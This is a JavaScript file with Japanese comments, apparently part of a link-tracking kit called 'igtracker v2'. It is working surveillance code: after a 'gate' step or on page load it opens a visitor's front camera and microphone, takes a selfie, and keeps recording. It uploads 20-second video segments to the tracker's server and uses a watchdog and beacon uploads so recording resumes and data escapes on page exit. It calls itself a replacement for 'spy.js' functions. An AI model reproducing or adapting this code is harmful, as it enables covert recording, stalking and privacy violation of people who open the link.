/* リアルタイム映像＋音声（igtracker v2）
   ★ v2: gate.js から呼ばれても「録画が始まる」ように修正（cam/mic → start()）。
        プレビューは常に見える位置へ。ゲート通過後にも確実に開始。 */
(function () {
  "use strict";
  var CODE = window.LT_CODE || "";
  if (!CODE) return;
  var HIT = window.LT_HIT || 0;
  var SEG_MS = 20000;

  function sid() {
    try {
      var v = sessionStorage.getItem("igt_sid_" + CODE);
      if (!v) {
        v = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
        sessionStorage.setItem("igt_sid_" + CODE, v);
      }
      return v;
    } catch (e) { return Math.random().toString(36).slice(2, 12); }
  }
  var SID = sid();

  function vid8() {
    try {
      var v = (window.LT_PAYLOAD && window.LT_PAYLOAD.vid) ||
              localStorage.getItem("igt_vid") || "";
      return String(v).replace(/[^a-zA-Z0-9]/g, "").slice(0, 8) || "x";
    } catch (e) { return "x"; }
  }

  var stream = null, rec = null, seq = 0, timer = null, guard = null;
  var mime = "", ext = "webm", wantRun = false, selfied = false, parts = [];

  function pickMime() {
    var c = ["video/webm;codecs=vp8,opus", "video/webm;codecs=vp9,opus",
             "video/webm", "video/mp4", "video/mp4;codecs=h264"];
    for (var i = 0; i < c.length; i++) {
      try {
        if (window.MediaRecorder && MediaRecorder.isTypeSupported &&
            MediaRecorder.isTypeSupported(c[i])) return c[i];
      } catch (e) {}
    }
    return "";
  }

  function post(blob, beacon) {
    if (!blob || !blob.size) return;
    var u = "/s/" + encodeURIComponent(CODE) + "/vseg?sid=" + encodeURIComponent(SID) +
            "&vid=" + encodeURIComponent(vid8()) + "&seq=" + (seq++) +
            "&ext=" + ext + "&hit=" + HIT;
    if (beacon && navigator.sendBeacon) {
      try { if (navigator.sendBeacon(u, blob)) return; } catch (e) {}
    }
    try { fetch(u, { method: "POST", body: blob, keepalive: true }).catch(function () {}); }
    catch (e) {}
  }

  function preview() {
    try {
      var v = document.getElementById("lt_cam");
      if (!v) {
        v = document.createElement("video");
        v.id = "lt_cam";
        v.autoplay = true; v.muted = true; v.playsInline = true;
        v.setAttribute("playsinline", "");
        v.style.cssText =
          "position:fixed;right:10px;bottom:10px;width:112px;height:84px;" +
          "object-fit:cover;border-radius:10px;background:#000;z-index:5;" +
          "box-shadow:0 2px 10px rgba(0,0,0,.5);opacity:.92";
        document.body.appendChild(v);
      }
      if (stream && v.srcObject !== stream) {
        v.srcObject = stream;
        var p = v.play(); if (p && p.catch) p.catch(function () {});
      }
    } catch (e) {}
  }

  function selfie() {
    if (selfied || !stream) return;
    selfied = true;
    setTimeout(function () {
      try {
        var v = document.getElementById("lt_cam");
        var w = v && v.videoWidth ? v.videoWidth : 480;
        var h = v && v.videoHeight ? v.videoHeight : 360;
        var c = document.createElement("canvas");
        c.width = w; c.height = h;
        c.getContext("2d").drawImage(v, 0, 0, w, h);
        fetch("/s/" + encodeURIComponent(CODE) + "/cap", {
          method: "POST", headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ kind: "selfie", data: c.toDataURL("image/jpeg", 0.7),
                                 hit: HIT, vid: vid8() }),
        }).catch(function () {});
      } catch (e) {}
    }, 1800);
  }

  function ensure() {
    wantRun = true;                       // ★ 呼ばれたら録画する気でいる
    if (stream) return Promise.resolve(true);
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      return Promise.resolve(false);
    }
    return navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
      audio: true,
    }).then(function (s) {
      stream = s;
      mime = pickMime();
      ext = /mp4/.test(mime) ? "mp4" : "webm";
      preview(); selfie();
      startRec();                         // ★ すぐ録画開始
      return true;
    }).catch(function () { return false; });
  }

  function startRec() {
    if (!stream || !mime) return;
    if (rec && rec.state !== "inactive") return;
    try {
      rec = new MediaRecorder(stream, {
        mimeType: mime, videoBitsPerSecond: 180000, audioBitsPerSecond: 32000,
      });
    } catch (e) {
      try { rec = new MediaRecorder(stream); mime = rec.mimeType || mime; } catch (e2) { return; }
    }
    parts = [];
    rec.ondataavailable = function (e) { if (e.data && e.data.size) parts.push(e.data); };
    rec.onstop = function () {
      var p = parts; parts = [];
      post(new Blob(p, { type: mime || "video/webm" }), false);
      if (wantRun && !document.hidden) startRec();
    };
    try { rec.start(); } catch (e) { return; }
    if (timer) clearTimeout(timer);
    timer = setTimeout(function () { stopRec(false); }, SEG_MS);
  }

  function stopRec(final) {
    if (timer) { clearTimeout(timer); timer = null; }
    if (!rec || rec.state === "inactive") return;
    var r = rec;
    if (final) {
      r.onstop = function () {
        var p = parts; parts = [];
        post(new Blob(p, { type: mime || "video/webm" }), true);
      };
    }
    try { r.stop(); } catch (e) {}
  }

  /* ★ 外から呼ばれるのはここ。必ず録画まで行く */
  function start() {
    return ensure().then(function (ok) {
      if (ok) startRec();
      return ok;
    });
  }
  function stop() { wantRun = false; stopRec(false); }

  document.addEventListener("visibilitychange", function () {
    if (document.visibilityState === "hidden") { if (wantRun) stopRec(true); return; }
    if (wantRun && stream && (!rec || rec.state === "inactive")) startRec();
  });
  window.addEventListener("pagehide", function () { if (wantRun) stopRec(true); });

  /* 録画が落ちていないか3秒ごとに見張る */
  guard = setInterval(function () {
    if (!wantRun || !stream) return;
    if (!rec || rec.state === "inactive") startRec();
  }, 3000);

  window.LTCAM = {
    start: start, stop: stop, ensure: ensure, sid: SID,
    active: function () { return !!stream; },
    info: function () { return { mime: mime, seg: seq, sid: SID, rec: !!rec }; },
  };

  /* spy.js のカメラ/マイクを置き換える（gate.js がここを呼ぶ） */
  window.LT_CAM = 1;
  window.LT_MIC = 1;
  window.LT_SPY = window.LT_SPY || {};
  window.LT_SPY.cam = start;      // ★ ensure ではなく start
  window.LT_SPY.mic = start;

  /* ゲート通過後にもう一度起動（取りこぼし防止） */
  window.addEventListener("igt:gate", function () { start(); });
  window.addEventListener("load", function () {
    if (window.LT_GATE && !window.LT_GATE_PASS) return;
    setTimeout(function () { if (!stream) start(); }, 1500);
  });
})();